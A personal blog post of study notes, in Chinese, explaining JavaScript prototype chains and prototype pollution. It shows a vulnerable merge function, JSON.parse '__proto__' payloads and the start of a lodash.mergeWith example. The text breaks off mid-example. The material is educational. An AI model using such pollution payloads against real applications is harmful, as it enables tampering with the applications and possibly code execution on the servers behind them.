<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | js原型污染学习笔记</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.104.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>js原型污染学习笔记</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">很早之前的了，同步到博客上一份，无参考价值 仅个人学习记录用</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/js>js</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-05-04T17:10:23+08:00>2022-5-4 17:10</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#基本定义>基本定义</a><ul><li><a href=#prototype__proto__><code>prototype</code>&<code>__proto__</code></a></li><li><a href=#constructor><code>constructor</code></a></li><li><a href=#原型链继承>原型链&继承</a></li><li><a href=#原型链污染>原型链污染</a></li></ul></li><li><a href=#应用场景>应用场景</a><ul><li><a href=#对象merge操作>对象<code>merge</code>操作</a></li><li><a href=#由传入参数定义对象属性>由传入参数定义对象属性</a></li><li><a href=#对象clone操作>对象<code>clone</code>操作</a></li></ul></li><li><a href=#攻击实现>攻击实现</a><ul><li><a href=#对象merge操作-1>对象<code>merge</code>操作</a></li><li><a href=#由传入参数定义对象属性-1>由传入参数定义对象属性</a></li><li><a href=#污染tostringvalueof方法造成500>污染<code>toString</code>&<code>valueOf</code>方法造成500</a></li><li><a href=#结合模板引擎rce的实例>结合模板引擎RCE的实例</a></li><li><a href=#借助其它库扩大攻击面>借助其它库扩大攻击面</a></li></ul></li><li><a href=#防御策略>防御策略</a><ul><li><a href=#冻结原型>冻结原型</a></li><li><a href=#白名单黑名单>白名单/黑名单</a></li><li><a href=#使用map结构>使用map结构</a></li><li><a href=#使用create进行防御>使用create进行防御</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>学的时候随手记录的，可能有很多错误，见谅（</p><p>参考链接统一在文末</p><hr><h2 id=基本定义>基本定义</h2><h3 id=prototype__proto__><code>prototype</code>&<code>__proto__</code></h3><p>js中定义类需要通过定义构造函数的方式进行</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Foo</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>bar</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>new</span> <span style=color:#75af00>Foo</span><span style=color:#111>()</span>
</span></span></code></pre></div><p><code>Foo</code>函数的内容就是<code>Foo</code>类的构造函数，而<code>this.bar</code>是<code>Foo</code>类的一个属性；除了定义了值的普通属性我们还可以将方法定义到构造函数内部</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Foo</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>bar</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>show</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>(){</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>bar</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>Foo</span><span style=color:#111>()).</span><span style=color:#75af00>show</span><span style=color:#111>()</span>
</span></span></code></pre></div><p>可是这样的写法会造成一个问题，即每当我们新建一个<code>Foo</code>对象时，<code>this.show = function()</code>这样的代码就会执行一次，<code>show</code>方法被绑定在对象上而不是类中；我们希望创建类时只创建一次<code>show</code>方法，这时候需要使用原型<code>prototype</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Foo</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>bar</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>Foo</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>show</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>show</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>bar</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>foo</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Foo</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#75af00>foo</span><span style=color:#111>.</span><span style=color:#75af00>show</span><span style=color:#111>()</span>
</span></span></code></pre></div><p><code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象都将拥有这个属性中的全部内容（包括变量和方法），比如上述代码中的<code>foo</code>对象可以直接调用<code>show</code>方法/函数</p><p>我们是通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但经过<code>Foo</code>实例化的对象是不能通过<code>.prototype</code>来访问原型的，而是借助<code>__proto__</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216103317818.png alt=image-20211216103317818></p><p>经由类实例化而来的对象可以通过<code>.__proto__</code>来访问对应类的原型，即</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>foo</span><span style=color:#111>.</span><span style=color:#75af00>__proto__</span> <span style=color:#f92672>==</span> <span style=color:#75af00>Foo</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span>
</span></span></code></pre></div><p>所以总结两点</p><ul><li>类自带<code>prototype</code>属性，经由类实例化来的对象会自动带上<code>prototype</code>中的属性和方法</li><li>经由类实例化而来的对象可以通过<code>.__proto__</code>来访问对应类的原型</li><li>经由类实例化而来的对象可以通过<code>.constructor</code>来获取构造这个实例的本来的函数</li></ul><h3 id=constructor><code>constructor</code></h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Dog</span><span style=color:#111>(</span><span style=color:#75af00>name</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>name</span> <span style=color:#f92672>=</span> <span style=color:#75af00>name</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>Dog</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>sayHi</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>function</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>  <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;I am&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>name</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>d</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Dog</span><span style=color:#111>(</span><span style=color:#d88200>&#39;yo&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>d</span><span style=color:#111>.</span><span style=color:#75af00>sayHi</span><span style=color:#111>()</span> <span style=color:#75715e>// I am yo
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>d</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>)</span> <span style=color:#75715e>// [Function: Dog]
</span></span></span></code></pre></div><p>最后一行，<code>d.constructor</code>可以返回构造这个实例的本来的函数</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>test</span><span style=color:#111>(){}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>test</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>)</span>	<span style=color:#75715e>// [Function: Function]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>test</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span> <span style=color:#f92672>===</span> <span style=color:#111>Function</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>)</span>	<span style=color:#75715e>// true
</span></span></span></code></pre></div><p>任意一个函数的contructor，都将会返回<code>Function.constructor</code>，而它可以用来构造函数</p><p>利用这一点，我们可以用任意内建函数来构造新的函数了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>f1</span> <span style=color:#f92672>=</span> <span style=color:#111>[].</span><span style=color:#75af00>map</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;console.log(123)&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>f2</span> <span style=color:#f92672>=</span> <span style=color:#111>Math</span><span style=color:#111>.</span><span style=color:#75af00>min</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;console.log(456)&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>f1</span><span style=color:#111>()</span>	<span style=color:#75715e>// 123
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>f2</span><span style=color:#111>()</span>	<span style=color:#75715e>// 456
</span></span></span></code></pre></div><p>甚至&mldr;&mldr;..也不是不可以嘛</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>f3</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>).</span><span style=color:#75af00>constructor</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span><span style=color:#111>(</span><span style=color:#d88200>&#39;console.log(&#34;abc&#34;)&#39;</span><span style=color:#111>)()</span>
</span></span><span style=display:flex><span><span style=color:#75af00>f3</span><span style=color:#111>()</span>	<span style=color:#75715e>// abc
</span></span></span></code></pre></div><p>同理，<code>[]</code>，<code>''</code>，<code>{}</code>都是可以的，单独的<code>()</code>不行 得有数字</p><h3 id=原型链继承>原型链&继承</h3><p>这么好的两个特性被用来实现js的继承机制，举个例子</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Father</span><span style=color:#111>(){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>firstName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Lao&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>lastName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Wang&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>Son</span><span style=color:#111>(){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>firstName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Ming&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>Son</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Father</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>son</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Son</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`Name: </span><span style=color:#d88200>${</span><span style=color:#75af00>son</span><span style=color:#111>.</span><span style=color:#75af00>firstName</span><span style=color:#d88200>}</span><span style=color:#d88200> </span><span style=color:#d88200>${</span><span style=color:#75af00>son</span><span style=color:#111>.</span><span style=color:#75af00>lastName</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Name: Ming Wang
</span></span></span></code></pre></div><p><code>son.lastName</code>被调用后查找<code>lastName</code>有一个顺序</p><ul><li>对象<code>son</code></li><li><code>son.__proto__</code></li><li><code>son.__proto__.__proto__</code></li><li><code>son.__proto__.__proto__.__proto__</code></li><li><code>son.__proto__.__proto__.__proto__.__proto__</code> -> NULL 结束</li></ul><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216104636009.png alt=image-20211216104636009></p><p>就是js这个在面向对象的继承中使用的查找机制，被称作原型继承链</p><p>————注意在这个查找的过程中并没有出现<code>prototype</code>，而是通过<code>xyz.__proto__</code>来暴露<code>prototype</code>，真正参与查找的 是对象的<code>__proto__</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216132321698.png alt=image-20211216132321698></p><p><img src=https://p5.ssl.qhimg.com/t011cffd77e8d3ec6c6.png alt=img></p><p>另外，对于继承的表达方式除了<code>.</code>还有<code>[]</code>，后者一般在属性名是动态时使用，两种表达方式是一样的</p><h3 id=原型链污染>原型链污染</h3><p>既然<code>foo.__proto__ == Foo.prototype</code>，那修改前者是否能直接影响类呢？</p><p>首先需要注意的：</p><blockquote><p><em>What&rsquo;s good to note about this property is that it&rsquo;s implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write. So assigning a new value to the property &ldquo;_<em>proto</em>_&rdquo; doesn&rsquo;t shadow the inherited value defined on the prototype. The only way to shadow it invovles using &ldquo;Object.defineProperty&rdquo;.</em></p></blockquote><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216141504236.png alt=image-20211216141504236></p><p>要注意，只是这样的修改并不足以污染原型链，只是修改当前运行状态下这个对象的属性而已，还要再向上找一级<code>__proto__</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216143104719.png alt=image-20211216143104719></p><p>一个正常的栗子</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216105206819.png alt=image-20211216105206819></p><p>我们通过<code>foo.__proto__.bar</code>修改的是<code>foo</code>的原型，当修改之后调用<code>foo.bar</code>由于查找顺序的原因并没有立即修改值，而继承自<code>{}</code>的<code>zoo</code>对象，其<code>bar</code>属性已经被污染了</p><p>综上，如果我们可以控制并修改一个对象的原型，就可以影响所有和这个对象来自同一类、父祖类的对象，这就是<strong>原型链污染</strong></p><h2 id=应用场景>应用场景</h2><p>常用的两种修改方式</p><ul><li><code>obj[a][b] = value</code>: <code>obj[__proto__][modify_property] = value</code></li><li><code>obj[a][b][c] = value</code>: <code>obj[constructor][prototype][modify_property] = value</code></li></ul><p>在什么情况下我们可以设置<code>__proto__</code>的值呢？我们找能控制数组（对象）的键名的操作即可</p><ul><li>Object recursive merge</li><li>Object clone</li><li>Property defination by path</li></ul><h3 id=对象merge操作>对象<code>merge</code>操作</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>merge</span><span style=color:#111>(</span><span style=color:#75af00>target</span><span style=color:#111>,</span> <span style=color:#75af00>source</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span><span style=color:#111>(</span><span style=color:#00a8c8>let</span> <span style=color:#75af00>key</span> <span style=color:#00a8c8>in</span> <span style=color:#75af00>source</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>key</span> <span style=color:#00a8c8>in</span> <span style=color:#75af00>source</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>key</span> <span style=color:#00a8c8>in</span> <span style=color:#75af00>target</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>merge</span><span style=color:#111>(</span><span style=color:#75af00>target</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>],</span> <span style=color:#75af00>source</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>])</span>	<span style=color:#75715e>// !
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>target</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#75af00>source</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>在第四行的赋值过程中，如果<code>key == '__proto__'</code>是否会造成原型链污染呢？</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>o1</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>o2</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#75af00>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;__proto__&#34;</span><span style=color:#f92672>:</span> <span style=color:#111>{</span><span style=color:#75af00>b</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>2</span><span style=color:#111>}}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>merge</span><span style=color:#111>(</span><span style=color:#75af00>o1</span><span style=color:#111>,</span> <span style=color:#75af00>o2</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>o1</span><span style=color:#111>.</span><span style=color:#75af00>a</span><span style=color:#111>,</span> <span style=color:#75af00>o1</span><span style=color:#111>.</span><span style=color:#75af00>b</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>o3</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>o3</span><span style=color:#111>.</span><span style=color:#75af00>b</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112209243.png alt=image-20211216112209243></p><p>虽然merge成功了，但是原型链被没有受到污染</p><p>原因是因为我们在<code>let o2 = {a: 1, "__proto__": {b: 2}}</code>创建o2时，实际的两个键名是<code>a, b</code>而不是<code>a, __proto__</code>，<code>__proto__</code>就不是一个key，自然也不会修改Object的原型（看起来很奇怪，但是就是这样</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220414112407556.png alt=image-20220414112407556></p><p>让它被认做一个键名需要修改一下创建o2的方式<code>let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112520073.png alt=image-20211216112520073></p><p>在JSON解析的情况下<code>__proto__</code>被认作是键名而不是原型，所以成功了</p><h3 id=由传入参数定义对象属性>由传入参数定义对象属性</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>theFunc</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#75af00>path</span><span style=color:#111>,</span> <span style=color:#75af00>value</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>object</span><span style=color:#111>.</span><span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>value</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>如果<code>path</code>和<code>value</code>的值可以被我们指定，我们可以设定<code>path = "__proto__.myValue"</code>，之后指定<code>value</code>的值</p><p>具体操作可见后面的CVE-2019-10795(undefsafe)，lodash.set</p><h3 id=对象clone操作>对象<code>clone</code>操作</h3><blockquote><p><em>Prototype pollution can happen with API that clone object when the API implements the clone as recursive merge on an empty object. Do note that merge function must be affected by the issue.</em></p></blockquote><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>clone</span><span style=color:#111>(</span><span style=color:#75af00>obj</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#75af00>merge</span><span style=color:#111>({},</span> <span style=color:#75af00>obj</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><h2 id=攻击实现>攻击实现</h2><p>奈何不是很好归类，如果按攻击方式归类的话会出现重复的模块和不好分类的地方，呜呜呜呜呜呜，好乱</p><h3 id=对象merge操作-1>对象<code>merge</code>操作</h3><h4 id=lodashmergewith>lodash.mergeWith</h4><p>类似lodash.merge，多接收一个参数customizer</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>mergeWith</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#75af00>sources</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#75af00>customizer</span><span style=color:#111>]);</span>
</span></span></code></pre></div><p>如果是undefined就跟merge一样了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>lodash</span><span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;{&#34;__proto__&#34;:{&#34;whoami&#34;:&#34;Vulnerable&#34;}}&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
